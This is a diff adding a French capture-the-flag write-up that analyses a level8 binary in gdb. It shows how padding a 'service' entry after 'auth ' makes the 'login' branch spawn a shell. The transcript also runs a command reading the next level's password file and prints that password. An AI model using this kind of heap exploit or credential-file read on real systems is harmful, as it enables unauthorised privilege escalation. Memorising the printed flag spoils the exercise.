@@ -1,0 +1,51 @@
+LEVEL 8
+-------
+
+1.	gdb level8
+
+2.	disas main
+	En regardant le programme de plus près on peut voir que system() est
+	appelé vers la fin.
+	Pour atteindre cette section il faut passer par plusieurs cmp.
+	0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
+	0x08048625 <+193>:	cmp    $0x1e,%eax
+	0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)
+	0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)
+	0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)
+
+	Le premier cmp va checker si stdin est égal à "auth ".
+	Si stdin est égal à "auth ", on alloue de la mémoire à
+	auth (variable globale).
+	
+	Le 2ème cmp va check la longueur de la chaine, si elle est inférieure
+	à 30, on fait un strcpy du stdin dans auth.
+	
+	Le 3ème cmp va checker si stdin est égal à "reset". Si stdin est
+	égal à "reset", on free auth.
+	
+	Le 4ème cmp va checker si stdin est égal à "service". Si stdin est
+	égal à "service", on fait un strdup sur la variable globale service.
+
+	Et le dernier cmp va checker si stdin est égal à "login". Si stdin est
+	égal à "login". 
+	On check si auth[32] est égal à '/0'. Si auth[32] est '/0', la fonction
+	fwrite("Password:\n", 1, 10, stdout) est appelée. Sinon system("/bin/sh")
+	est lancé.
+
+
+3.	On va appeler "auth " une fois. Ensuite on va appeler une fois "service"
+	avec des caractères derrière pour combler les 32 bytes.
+	./level8
+	(nil), (nil)
+	auth (avec un espace à la fin)
+	0x804a008, (nil)
+	serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	0x804a008, 0x804a018
+	login
+	$ whoami
+	level9
+	$ cat /home/user/level9/.pass
+	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+4.	su level9
+	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
